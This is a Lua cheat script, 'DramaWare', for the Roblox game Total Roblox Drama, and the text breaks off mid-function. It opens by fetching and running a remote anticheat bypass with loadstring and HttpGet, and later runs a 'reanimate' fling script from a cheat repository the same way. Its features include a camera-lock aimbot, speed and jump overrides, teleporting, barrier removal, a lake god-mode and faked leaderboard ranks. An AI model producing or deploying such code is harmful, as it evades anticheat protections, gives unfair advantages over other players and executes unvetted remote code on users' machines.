setclipboard("https://discord.gg/6PaSN7wepr")

--this script bypasses the TRD anticheat (adonis) incase your existing executor doesn't automatically do that. 
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
print("ran ac byp")
if not cloneref then cloneref = function(x) return x end end
if not gethui then gethui = function() return game:GetService("CoreGui") end end
if not writefile then writefile = function() end end
if not readfile then readfile = function() return "" end end
if not makefolder then makefolder = function() end end
if not isfile then isfile = function() return false end end
if not isfolder then isfolder = function() return false end end
if not getcustomasset then getcustomasset = function() return "" end end
if not isrbxactive then isrbxactive = function() return true end end
if not protect_gui then protect_gui = function() end end
if not get_hidden_gui then get_hidden_gui = gethui end
if not getgenv then getgenv = function() return getfenv(0) end end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
print("defined rayfield")
local _DramaWareHttp = game:GetService("HttpService")
local _DramaWare_Elements = {}

-- no scope issues hopefully
local playerHighlight = nil
local autoWinObby = false
local voteConn = nil
local juryVoteConns = nil
local printVotesConn = nil
local exposeVotesConn = nil
local rainbowNameConn = nil
local exileVotesConn = nil

local function DramaWare_EnsureFolders()
    print("ensurin folders")
    pcall(function()
        if not isfolder("DramaWare") then makefolder("DramaWare") end
        if not isfolder("DramaWare/Configs") then makefolder("DramaWare/Configs") end
    end)
end

local function DramaWare_ListConfigs()
    print("listing cfgs")
    local names = {}
    pcall(function()
        DramaWare_EnsureFolders()
        local files = (listfiles and listfiles("DramaWare/Configs")) or {}
        for _, path in ipairs(files) do
            local name = tostring(path):match("([^/\\]+)%.json$")
            if name and name ~= "" then table.insert(names, name) end
        end
    end)
    if #names == 0 then names = {"(no saved configs)"} end
    return names
end

local _DramaWare_SkipFlags = { DramaWareConfigDropdown = true }

local function DramaWare_PackColor(c)
    return {R = math.floor(c.R * 255 + 0.5), G = math.floor(c.G * 255 + 0.5), B = math.floor(c.B * 255 + 0.5)}
end

local function DramaWare_UnpackColor(t)
    return Color3.fromRGB(t.R or 0, t.G or 0, t.B or 0)
end

local function DramaWare_SaveConfig(name)
    print("savin config")
    DramaWare_EnsureFolders()
    local data = {}
    for flag, obj in pairs(Rayfield.Flags) do
        if not _DramaWare_SkipFlags[flag] then
            pcall(function()
                if obj.Type == "ColorPicker" then
                    if obj.Color then
                        data[flag] = DramaWare_PackColor(obj.Color)
                    end
                elseif typeof(obj.CurrentValue) == "boolean" then
                    data[flag] = obj.CurrentValue
                else
                    local v = obj.CurrentValue or obj.CurrentKeybind or obj.CurrentOption or obj.Color
                    if v ~= nil then data[flag] = v end
                end
            end)
        end
    end
    local ok, json = pcall(function() return _DramaWareHttp:JSONEncode(data) end)
    if ok then
        pcall(function() writefile("DramaWare/Configs/" .. name .. ".json", json) end)
    end
end

local function DramaWare_LoadConfig(name)
    local path = "DramaWare/Configs/" .. name .. ".json"
    local exists = false
    pcall(function() exists = isfile(path) end)
    if not exists then return false end
    local ok, data = pcall(function()
        return _DramaWareHttp:JSONDecode(readfile(path))
    end)
    if ok and data then
        for flag, value in pairs(data) do
            if not _DramaWare_SkipFlags[flag] then
                local f, v = flag, value
                task.spawn(function()
                    pcall(function()
                        local flagObj = Rayfield.Flags[f]
                        if flagObj and flagObj.Type == "ColorPicker" and type(v) == "table" then
                            v = DramaWare_UnpackColor(v)
                        end
                        local el = _DramaWare_Elements[f]
                        if el and el.Set then
                            el:Set(v)
                        elseif flagObj and flagObj.Set then
                            flagObj:Set(v)
                        end
                    end)
                end)
            end
        end
        return true
    end
    return false
end

local function DramaWare_PatchTab(tab)
    print("patching tab")
    if not tab then return end
    for _, m in ipairs({"CreateToggle","CreateDropdown","CreateSlider","CreateColorPicker","CreateKeybind"}) do
        local orig = tab[m]
        if orig then
            tab[m] = function(s, cfg, ...)
                local el = orig(s, cfg, ...)
                if cfg and type(cfg) == "table" and cfg.Flag and el then
                    _DramaWare_Elements[cfg.Flag] = el
                end
                return el
            end
        end
    end
end

print(Rayfield)
print("defining places")
local isCamp = game.PlaceId == 4939362930
local isLobby = game.PlaceId == 4889315193 or game.PlaceId == 14884976124
local isPractice = game.PlaceId == 15365802831
local isMovies = game.PlaceId == 4939362610
local isExpedition = game.PlaceId == 7172152072

local function saveTheme(theme)
    pcall(function()
        if not isfolder("DramaWare") then makefolder("DramaWare") end
        writefile("DramaWare/Theme.txt", theme)
    end)
end

local function loadTheme()
    local theme = nil
    pcall(function()
        if isfile("DramaWare/Theme.txt") then
            local t = readfile("DramaWare/Theme.txt"):match("^%s*(.-)%s*$")
            if t and t ~= "" then theme = t end
        end
    end)
    return theme
end

if not isCamp and not isLobby and not isPractice and not isMovies and not isExpedition then
    Rayfield:Notify({
        Title = "Wrong Game",
        Content = "Execute this script in Total Roblox Drama: Camp or Movies",
        Duration = 6,
        Image = "alert-triangle",
    })
    return
end

if not request then request = http_request or (syn and syn.request) or (function() end) end
if not setclipboard then setclipboard = toclipboard or (Clipboard and Clipboard.set) or function() end end
if not firetouchinterest then firetouchinterest = function() end end
if not fireclickdetector then fireclickdetector = function() end end

local player = game:GetService("Players").LocalPlayer
local camera = workspace.CurrentCamera

local chosen_theme = "Default"
local theme_success, theme_result = pcall(function()
    return loadTheme()
end)

if theme_success and type(theme_result) == "string" and theme_result ~= "" then
    chosen_theme = theme_result
end

local game_type = "idk"
if isCamp then
    game_type = "camp"
elseif isMovies then
    game_type = "movies"
elseif isExpedition then
    game_type = "expo"
end

local isResetting = false
local isPlaying = false
local cooldown = false
local boatBackup = nil

local function swapToSleigh()
    if not isCamp then return end
    local rs = game:GetService("ReplicatedStorage")
    local ws = game:GetService("Workspace")
    local elimFolder = ws:FindFirstChild("ElimMethod")
    if not elimFolder then return end
    local sleighTemplate = rs:FindFirstChild("Products") and rs.Products:FindFirstChild("ElimMethods") and rs.Products.ElimMethods:FindFirstChild("Camp") and rs.Products.ElimMethods.Camp:FindFirstChild("Sleigh Elimination")
    if not sleighTemplate then return end

    if isResetting or isPlaying or cooldown then return end
    isPlaying = true
    cooldown = true

    local boat = elimFolder:FindFirstChild("Boat Elimination")
    if boat then
        boatBackup = boat:Clone()
        boatBackup.Parent = rs
    end

    for _, v in pairs(elimFolder:GetChildren()) do
        v:Destroy()
    end

    local clone = sleighTemplate:Clone()
    clone.Name = "Sleigh Elimination"
    clone.Parent = elimFolder
    
    if rs:FindFirstChild("Products") and rs.Products:FindFirstChild("DataStore") and rs.Products.DataStore:FindFirstChild("Elimination") then
        rs.Products.DataStore.Elimination.Value = "Sleigh Elimination"
    end

    local sound = clone:FindFirstChild("Sound", true)
    if sound then
        sound:Play()
    end

    task.wait(18)

    for _, v in pairs(clone:GetDescendants()) do
        if v:IsA("BasePart") then v.Anchored = true end
        if v:IsA("ParticleEmitter") or v:IsA("PointLight") then v.Enabled = true end
    end

    local tp = clone:FindFirstChild("TELEPORT", true)
    local flySpots = clone:FindFirstChild("FlySpots", true)

    if flySpots then
        local spots = flySpots:GetChildren()
        table.sort(spots, function(a, b)
            return tonumber(a.Name) < tonumber(b.Name)
        end)

        task.spawn(function()
            if tp then
                clone:PivotTo(tp.CFrame)
                task.wait(0.1)
            end

            for _, spot in pairs(spots) do
                local startCF = clone:GetPivot()
                local endCF = spot.CFrame
                local dist = (startCF.Position - endCF.Position).Magnitude
                local speed = 25
                local travelTime = dist / speed
                local elapsed = 0

                while elapsed < travelTime do
                    local dt = task.wait(0.03)
                    elapsed = elapsed + dt
                    local alpha = math.clamp(elapsed / travelTime, 0, 1)
                    clone:PivotTo(startCF:Lerp(endCF, alpha))
                end
            end

            isResetting = true
            clone:Destroy()

            if boatBackup then
                local defaultClone = boatBackup:Clone()
                defaultClone.Name = "Boat Elimination"
                defaultClone.Parent = elimFolder
                if rs:FindFirstChild("Products") and rs.Products:FindFirstChild("DataStore") and rs.Products.DataStore:FindFirstChild("Elimination") then
                    rs.Products.DataStore.Elimination.Value = "Boat Elimination"
                end
            end

            isResetting = false
            isPlaying = false
        end)
    else
        isPlaying = false
    end

    task.spawn(function()
        task.wait(10)
        cooldown = false
    end)
end

local _Players = game:GetService('Players')
local _RunService = game:GetService('RunService')
local _LocalPlayer = _Players.LocalPlayer
local v4 = _LocalPlayer
_LocalPlayer.GetMouse(v4)
local u5 = false
local u6 = 0.1768
local function FindNearestEnemy()
    local _huge = math.huge
    local v8 = Vector2.new(game:GetService('GuiService'):GetScreenResolution().X / 2, game:GetService('GuiService'):GetScreenResolution().Y / 2)
    local v9 = _Players
    local v10, v11, v12 = ipairs(v9:GetPlayers())
    local v13 = nil
    while true do
        local v14
        v12, v14 = v10(v11, v12)
        if v12 == nil then break end
        if v14 ~= _LocalPlayer then
            local _Character = v14.Character
            if _Character and (_Character:FindFirstChild('HumanoidRootPart') and _Character.Humanoid.Health > 0) then
                local v16, v17 = workspace.CurrentCamera:WorldToViewportPoint(_Character.HumanoidRootPart.Position)
                if v17 then
                    local _Magnitude = (v8 - Vector2.new(v16.X, v16.Y)).Magnitude
                    if _Magnitude < _huge then
                        v13 = v14
                        _huge = _Magnitude
                    end
                end
            end
        end
    end
    return v13
end

local function u21(p19)
    if p19 and p19.Character then
        local _Highlight = Instance.new('Highlight')
        _Highlight.Adornee = p19.Character
        _Highlight.FillColor = Color3.fromRGB(255, 255, 255)
        _Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
        _Highlight.FillTransparency = 0.5
        _Highlight.OutlineTransparency = 0
        _Highlight.Parent = p19.Character
        return _Highlight
    end
end

local function u27(p22)
    if p22 and p22.Character then
        local v23, v24, v25 = ipairs(p22.Character:GetChildren())
        while true do
            local v26
            v25, v26 = v23(v24, v25)
            if v25 == nil then break end
            if v26:IsA('Highlight') then v26:Destroy() end
        end
    end
end

local u28 = nil
local u29 = nil
_RunService.Heartbeat:Connect(function()
    if u5 and (u28 and u28.Character) then
        local _CurrentCamera = workspace.CurrentCamera
        local _HumanoidRootPart = u28.Character:FindFirstChild('HumanoidRootPart')
        if _HumanoidRootPart then
            _CurrentCamera.CFrame = CFrame.new(_CurrentCamera.CFrame.p, _HumanoidRootPart.Position + _HumanoidRootPart.Velocity * u6)
        end
    end
end)

local _ScreenGui = Instance.new('ScreenGui')
local _CL_Button = Instance.new('TextButton')
local _UICorner = Instance.new('UICorner')
_ScreenGui.Name = 'veerve'
_ScreenGui.Enabled = false
_ScreenGui.Parent = game:GetService('CoreGui')
_ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_CL_Button.Parent = _ScreenGui
_CL_Button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
_CL_Button.BackgroundTransparency = 0.3
_CL_Button.BorderSizePixel = 0
_CL_Button.Position = UDim2.new(0.5, -50, 0, 40)
_CL_Button.Size = UDim2.new(0, 100, 0, 24)
_CL_Button.Font = Enum.Font.GothamBold
_CL_Button.Text = 'camlock: off'
_CL_Button.TextColor3 = Color3.fromRGB(255, 255, 255)
_CL_Button.TextSize = 13
_UICorner.CornerRadius = UDim.new(0, 6)
_UICorner.Parent = _CL_Button
_CL_Button.MouseButton1Click:Connect(function()
    u5 = not u5
    if u5 then
        u28 = FindNearestEnemy()
        if u28 then u29 = u21(u28) end
        _CL_Button.Text = 'camlock: on'
        _CL_Button.TextColor3 = Color3.fromRGB(100, 255, 130)
    else
        if u29 then u27(u28) u29 = nil end
        u28 = nil
        _CL_Button.Text = 'camlock: off'
        _CL_Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

do
    local _RunService = game:GetService("RunService")
    local _UIS = game:GetService("UserInputService")
    local _lhj_enabled = true
    local _lhj_freeze = 0.15
    local _lhj_height = 69
    local _lhj_cooldown = 0.5
    local _lhj_last = 0

    local function _isChatFocused()
        return _UIS:GetFocusedTextBox() ~= nil
    end

    function dolaghighjump(skipChecks)
        if not _lhj_enabled then return end
        if not skipChecks and (tick() - _lhj_last) < _lhj_cooldown then return end
        local char = game.Players.LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp and hum then
            if not skipChecks and hum.FloorMaterial == Enum.Material.Air then return end
            _lhj_last = tick()
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait(0.01)
            local s = os.clock()
            while os.clock() - s < _lhj_freeze do end
            hrp.AssemblyLinearVelocity = Vector3.new(
                hrp.AssemblyLinearVelocity.X,
                _lhj_height,
                hrp.AssemblyLinearVelocity.Z
            )
        end
    end

    function doFloorBounce()
        local char = game.Players.LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if hum.FloorMaterial == Enum.Material.Air then return end
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
        task.spawn(function()
            repeat task.wait() until hum.FloorMaterial == Enum.Material.Air
            repeat task.wait() until hum.FloorMaterial ~= Enum.Material.Air
            dolaghighjump(true)
        end)
    end

    local _LedgeEnabled    = false
    local _LedgeReach      = 1.0
    local _FpsBounceEnabled = false
    local _FpsPower        = 42
    local _FpsVertical     = 21
    local _lastClimbTime   = 0

    _G._DramaWare_SetLedge = function(v)
        _LedgeEnabled    = v
        _FpsBounceEnabled = v
    end

    _RunService.Heartbeat:Connect(function()
        if not _LedgeEnabled then return end
        local char = game.Players.LocalPlayer.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if hum.FloorMaterial ~= Enum.Material.Air then return end
        if hum:GetState() == Enum.HumanoidStateType.Climbing then return end
        if (tick() - _lastClimbTime) < 0.1 then return end
        local forward = Vector3.new(hrp.CFrame.LookVector.X, 0, hrp.CFrame.LookVector.Z).Unit
        local flatVel = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
        if flatVel:Dot(forward) < 0.5 then return end
        local params = RaycastParams.new()
        params.FilterDescendantsInstances = {char}
        params.FilterType = Enum.RaycastFilterType.Exclude
        local wallRay = workspace:Raycast(hrp.Position, forward * _LedgeReach, params)
        if not wallRay then return end
        local distToWall = (Vector3.new(wallRay.Position.X, hrp.Position.Y, wallRay.Position.Z) - hrp.Position).Magnitude
        local nativeRange = hrp.Size.Z / 2 + 0.6
        if distToWall <= nativeRange then return end
        local probeOrigin = Vector3.new(wallRay.Position.X, hrp.Position.Y + 3.5, wallRay.Position.Z)
        local topRay = workspace:Raycast(probeOrigin, Vector3.new(0, -5, 0), params)
        if not topRay then return end
        local heightDiff = topRay.Position.Y - hrp.Position.Y
        if heightDiff < -2.0 or heightDiff > 5.0 then return end
        if topRay.Normal.Y < 0.7 then return end
        local halfDepth = hrp.Size.Z / 2 + 0.05
        local snapPos   = wallRay.Position + wallRay.Normal * halfDepth
        hrp.CFrame = CFrame.new(
            Vector3.new(snapPos.X, hrp.Position.Y, snapPos.Z),
            Vector3.new(snapPos.X, hrp.Position.Y, snapPos.Z) + forward
        )
        _lastClimbTime = tick()
    end)

    _UIS.JumpRequest:Connect(function()
        local char = game.Players.LocalPlayer.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end
        if hum:GetState() == Enum.HumanoidStateType.Climbing then
            if tick() - _lastClimbTime > 0.2 then
                if _FpsBounceEnabled then
                    local velocity = (-hrp.CFrame.LookVector * _FpsPower) + Vector3.new(0, _FpsVertical, 0)
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.spawn(function()
                        local s = tick()
                        while tick() - s < 0.12 do
                            hrp.AssemblyLinearVelocity = velocity
                            _RunService.Heartbeat:Wait()
                        end
                    end)
                end
            end
        end
    end)

    -- press alt to do LHJ
    _RunService.Heartbeat:Connect(function()
        if _isChatFocused() then return end
        if _UIS:IsKeyDown(Enum.KeyCode.LeftAlt) then
            local char = game.Players.LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum and hum.FloorMaterial ~= Enum.Material.Air then
                dolaghighjump()
            end
        end
    end)

    
    local _PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local _LHJGui = Instance.new("ScreenGui")
    _LHJGui.Name = "LagHighJumpUI"
    _LHJGui.ResetOnSpawn = false
    _LHJGui.Enabled = false
    _LHJGui.Parent = _PlayerGui
    _G._DramaWare_LHJGui = _LHJGui

    local _LHJButton = Instance.new("TextButton")
    _LHJButton.Size = UDim2.new(0, 110, 0, 36)
    _LHJButton.Position = UDim2.new(1, -140, 1, -160)
    _LHJButton.AnchorPoint = Vector2.new(0, 0)
    _LHJButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    _LHJButton.BackgroundTransparency = 0.3
    _LHJButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    _LHJButton.TextScaled = true
    _LHJButton.Font = Enum.Font.SourceSansBold
    _LHJButton.Text = "Lag High Jump"
    _LHJButton.ZIndex = 10
    _LHJButton.Parent = _LHJGui

    local _FBButton = Instance.new("TextButton")
    _FBButton.Size = UDim2.new(0, 110, 0, 36)
    _FBButton.Position = UDim2.new(1, -140, 1, -205)
    _FBButton.AnchorPoint = Vector2.new(0, 0)
    _FBButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    _FBButton.BackgroundTransparency = 0.3
    _FBButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    _FBButton.TextScaled = true
    _FBButton.Font = Enum.Font.SourceSansBold
    _FBButton.Text = "Floor Bounce"
    _FBButton.ZIndex = 10
    _FBButton.Parent = _LHJGui

    _LHJButton.MouseButton1Click:Connect(function()
        if not _isChatFocused() then dolaghighjump() end
    end)
    _FBButton.MouseButton1Click:Connect(function()
        if not _isChatFocused() then doFloorBounce() end
    end)
end

print(Rayfield)
if isLobby then
    local Window = Rayfield:CreateWindow({
        Name = "dw-source - .gg/6PaSN7wepr",
        LoadingTitle = " dw-source (" .. game_type .. ")",
        LoadingSubtitle = "made by kobi, callie, claude and irib",
        ShowText = "Dramaware",
        Theme = chosen_theme,
        DisableRayfieldPrompts = true,
        DisableBuildWarnings = true,
        CustomUIStrings = {
            ["Rayfield"] = "Dramaware",
            ["Hide"] = "Hide",
            ["Show"] = "Show"
        },
        ConfigurationSaving = {
            Enabled = true,
            FolderName = "DramaWare",
            FileName = "Config"
        }
    })
    local InfoTab = Window:CreateTab("Info", "info")
    InfoTab:CreateSection("Dramaware")
    InfoTab:CreateLabel("You are in the Lobby.", "home")
    InfoTab:CreateLabel("All game modes supported: Camp, Movies, Expedition, Practice.", "gamepad-2")
    InfoTab:CreateButton({
        Name = "Fling/Restart Day (Reanimate)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
        end,
    })
    InfoTab:CreateDivider()
    local ClientTab = Window:CreateTab("Visuals", "eye")
    _G.SelectedFont = nil
    _G.StaticColor = Color3.fromRGB(255, 182, 193)
    _G.StaticColorCustom = false
    _G.RainbowMode = false
    _G.RainbowSpeed = 0.5
    _G.CustomName = ""
    _G.UseCustomName = false
    ClientTab:CreateSection("Appearance")
    ClientTab:CreateInput({
       Name = "Custom Name",
       PlaceholderText = "Enter name here...",
       RemoveTextAfterFocusLost = false,
       Callback = function(Text)
           _G.CustomName = Text
           _G.UseCustomName = (Text ~= "")
       end,
    })
    ClientTab:CreateButton({
        Name = "Apply Starborn Font",
        Callback = function()
            local _sfHttp = game:GetService("HttpService")
            local _sfTTF = "starborn.ttf"
            local _sfJSON = "Starborn.json"
            local _sfURL = "https://drive.google.com/uc?export=download&id=1k9H8G60p7iaJL4hHcyWEXgWJbONqam8_"
            local _sfMult = 0.6
            local _sfBlacklist = {
                "Chat", "BubbleChat", "ChatChannelParentFrame", "MessageLogDisplay",
                "DevConsoleMaster", "DeveloperConsole", "RobloxGui", "RobloxPromptGui",
                "PlayerList", "StatLabel", "StatusText"
            }
            local function _sfApply(obj)
                if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
                if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
                for _, name in ipairs(_sfBlacklist) do
                    if obj.Name == name or obj:FindFirstAncestor(name) then return end
                end
                obj.FontFace = Font.new(getcustomasset(_sfJSON))
                if not obj:GetAttribute("FontScaledV2") then
                    if obj.TextSize > 0 then
                        obj.TextSize = math.clamp(obj.TextSize * _sfMult, 8, 100)
                    end
                    obj:SetAttribute("FontScaledV2", true)
                end
            end
            if not isfile(_sfTTF) then
                writefile(_sfTTF, game:HttpGet(_sfURL))
            end
            writefile(_sfJSON, _sfHttp:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_sfTTF)}}
            }))
            for _, d in pairs(game:GetDescendants()) do pcall(_sfApply, d) end
            game.DescendantAdded:Connect(function(d)
                task.wait(0.1)
                pcall(_sfApply, d)
            end)
            Rayfield:Notify({
                Title = "Font Applied",
                Content = "Starborn font has been applied!",
                Duration = 4,
                Image = "type",
            })
        end,
    })
    ClientTab:CreateButton({
        Name = "Apply Minecraft Font",
        Callback = function()
            local _mcHttp = game:GetService("HttpService")
            local _mcTTF = "minecrafter.ttf"
            local _mcJSON = "Minecrafter.json"
            local _mcURL = "https://drive.google.com/uc?export=download&id=1_LSZQUGrKHzJctxK7Jp8rVRRVWIvdif4"
            local _mcMult = 0.6
            local function _mcApply(obj)
                if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
                if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
                obj.FontFace = Font.new(getcustomasset(_mcJSON))
                if not obj:GetAttribute("FontScaledMC") then
                    obj.TextSize = math.clamp(obj.TextSize * _mcMult, 8, 100)
                    obj:SetAttribute("FontScaledMC", true)
                end
            end
            if not isfile(_mcTTF) then
                writefile(_mcTTF, game:HttpGet(_mcURL))
            end
            writefile(_mcJSON, _mcHttp:JSONEncode({
                name = "Minecrafter",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_mcTTF)}}
            }))
            for _, d in pairs(game:GetDescendants()) do pcall(_mcApply, d) end
            game.DescendantAdded:Connect(function(d)
                task.wait(0.1)
                pcall(_mcApply, d)
            end)
            Rayfield:Notify({
                Title = "Font Applied",
                Content = "Minecraft font has been applied!",
                Duration = 4,
                Image = "type",
            })
        end,
    })
    ClientTab:CreateToggle({
        Name = "VIP Name Tag",
        CurrentValue = false,
        Flag = "VIPNameTagLobby",
        Callback = function(Value)
            local player = game.Players.LocalPlayer
            local char = player.Character
            if not char then return end
            local head = char:FindFirstChild("Head")
            if not head then return end
            local playerName = head:FindFirstChild("playerName")
            if not playerName then return end
            local vip = playerName:FindFirstChild("VIP")
            if vip then
                vip.Visible = Value
                for _, v in ipairs(vip:GetDescendants()) do
                    if v:IsA("GuiObject") then v.Visible = Value end
                end
            end
            for _, v in ipairs(playerName:GetDescendants()) do
                if v:IsA("TextLabel") or v:IsA("TextButton") then
                    if Value then
                        if not _G.VIPOrigColors then _G.VIPOrigColors = {} end
                        if not _G.VIPOrigColors[v] then _G.VIPOrigColors[v] = v.TextColor3 end
                        v.TextColor3 = Color3.fromRGB(255, 165, 0)
                    else
                        if _G.VIPOrigColors and _G.VIPOrigColors[v] then
                            v.TextColor3 = _G.VIPOrigColors[v]
                            _G.VIPOrigColors[v] = nil
                        end
                    end
                end
            end
        end,
    })
    ClientTab:CreateToggle({
       Name = "Rainbow Effect",
       CurrentValue = false,
       Flag = "RainbowToggle",
       Callback = function(Value)
          _G.RainbowMode = Value
       end,
    })
    ClientTab:CreateColorPicker({
        Name = "Static Color",
        Color = Color3.fromRGB(255, 182, 193),
        Flag = "ColorPicker",
        Callback = function(Value)
            _G.StaticColor = Value
            _G.StaticColorCustom = true
        end
    })
    ClientTab:CreateDropdown({
        Name = "UI Theme",
        Options = {"Default", "AmberGlow", "Amethyst", "Bloom", "DarkBlue", "Green", "Light", "Ocean", "Serenity"},
        CurrentOption = {chosen_theme},
        MultipleOptions = false,
        Flag = "ThemeDropdown",
        Callback = function(option)
            Window.ModifyTheme(option[1])
            saveTheme(option[1])
        end,
    })
    ClientTab:CreateButton({
        Name = "Fake #1 All Leaderboards",
        Callback = function()
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=48&height=48&format=png"
            local boards = {
                workspace.Elements.MoviesWinLeaderboard,
                workspace.Elements.CampWinLeaderboard,
                workspace.Elements.ExpeditionWinLeaderboard
            }
            for _, board in pairs(boards) do
                local scrollFrame = board.SurfaceGui.ScrollingFrame
                for _, frame in pairs(scrollFrame:GetChildren()) do
                    if frame:IsA("Frame") then
                        local placeLabel = frame:FindFirstChild("Image") and frame.Image:FindFirstChild("Place")
                        if placeLabel and placeLabel.Text == "1" then
                            frame.PName.Text = player.Name
                            frame.Image.Image = avatarUrl
                            break
                        end
                    end
                end
            end
        end,
    })
    ClientTab:CreateDivider()
    game:GetService("RunService").RenderStepped:Connect(function()
        local char = game.Players.LocalPlayer.Character
        if not char then return end
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                if _G.UseCustomName and _G.CustomName ~= "" then
                    obj.Text = _G.CustomName
                end
                if _G.RainbowMode then
                    local hue = (tick() * _G.RainbowSpeed) % 1
                    obj.TextColor3 = Color3.fromHSV(hue, 0.6, 1)
                elseif _G.StaticColorCustom then
                    obj.TextColor3 = _G.StaticColor
                end
                obj.TextStrokeTransparency = 0.5
                obj.BackgroundTransparency = 1
            end
        end
    end)
    return
end

local function _BuildUniversalTab(_utab)
    _utab:CreateSection("Player")
    _utab:CreateSlider({
        Name = "Walkspeed",
        Range = {1, 350},
        Increment = 1,
        Suffix = "Speed",
        CurrentValue = 16,
        Flag = "WalkSpeed",
        Callback = function(Value)
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.WalkSpeed = Value
            end
        end,
    })
    _utab:CreateSlider({
        Name = "Jump Power",
        Range = {1, 350},
        Increment = 1,
        Suffix = "Power",
        CurrentValue = 50,
        Flag = "JumpPower",
        Callback = function(Value)
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.JumpPower = Value
            end
        end,
    })
    _utab:CreateSlider({
        Name = "Field of View",
        Range = {30, 120},
        Increment = 1,
        Suffix = "FOV",
        CurrentValue = 70,
        Flag = "FieldOfView",
        Callback = function(Value)
            workspace.CurrentCamera.FieldOfView = Value
        end,
    })

    if isCamp then
        _utab:CreateToggle({
            Name = "Walk on Water",
            CurrentValue = false,
            Flag = "WalkOnWater",
            Callback = function(Value)
                local lake = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Roblox Drama: Camp") and workspace.Map["Roblox Drama: Camp"].Map:FindFirstChild("Lake")
                if lake and lake:FindFirstChild("Water") then
                    lake.Water.CanCollide = Value
                end
            end,
        })
        _utab:CreateButton({
            Name = "Lake God-Mode",
            Callback = function()
                pcall(function()
                    local sand = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Roblox Drama: Camp") and workspace.Map["Roblox Drama: Camp"]:FindFirstChild("Sand")
                    if sand and sand:FindFirstChild("TouchInterest") then
                        sand.TouchInterest:Destroy()
                    end
                end)
            end,
        })
    end

    _utab:CreateButton({
        Name = "Remove Barriers",
        Callback = function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v.Name == "Glass" or v.Name == "ChallengeGlass" or v.Name == "AwardCeremony" or v.Name == "Drop-Off" then
                    v:Destroy()
                end
            end
        end,
    })

    local stat = ""
    local list = {}
    pcall(function()
        if game.ReplicatedStorage:FindFirstChild("Season") and game.ReplicatedStorage.Season:FindFirstChild("Players") then
            for _, v in ipairs(game.ReplicatedStorage.Season.Players:GetChildren()) do
                if v.Name ~= player.Name then
                    table.insert(list, v.Value)
                end
            end
        end
    end)
    if #list == 0 then table.insert(list, "None") end

    _utab:CreateDivider()
    local Dropdownoo = _utab:CreateDropdown({
        Name = "Choose Player",
        Options = list,
        CurrentOption = {list[1]},
        MultipleOptions = false,
        Flag = "ChoosePlayer",
        Callback = function(Options)
            stat = Options[1]
        end,
    })
    
    _utab:CreateButton({
        Name = "Refresh List",
        Callback = function()
            local nlist = {}
            if game.ReplicatedStorage:FindFirstChild("Season") and game.ReplicatedStorage.Season:FindFirstChild("Players") then
                for _, v in ipairs(game.ReplicatedStorage.Season.Players:GetChildren()) do
                    if v:IsA("ValueBase") and v.Name ~= player.Name then
                        table.insert(nlist, tostring(v.Value))
                    end
                end
            end
            if #nlist == 0 then table.insert(nlist, "None") end
            Dropdownoo:Refresh(nlist)
            Dropdownoo:Set({nlist[1]})
            stat = nlist[1]
        end,
    })

    _utab:CreateButton({
        Name = "Teleport to Player",
        Callback = function()
            if stat == "None" then return end
            if game.ReplicatedStorage:FindFirstChild("Season") and game.ReplicatedStorage.Season:FindFirstChild("Players") then
                for _, v in ipairs(game.ReplicatedStorage.Season.Players:GetChildren()) do
                    if v.Value == stat then
                        local targetPlayer = game.Players:FindFirstChild(v.Name)
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
                        end
                        break
                    end
                end
            end
        end,
    })

    _utab:CreateToggle({
        Name = "Highlight Player",
        CurrentValue = false,
        Flag = "HighlightPlayer",
        Callback = function(Value)
            if Value then
                if stat == "None" then return end
                if game.ReplicatedStorage:FindFirstChild("Season") and game.ReplicatedStorage.Season:FindFirstChild("Players") then
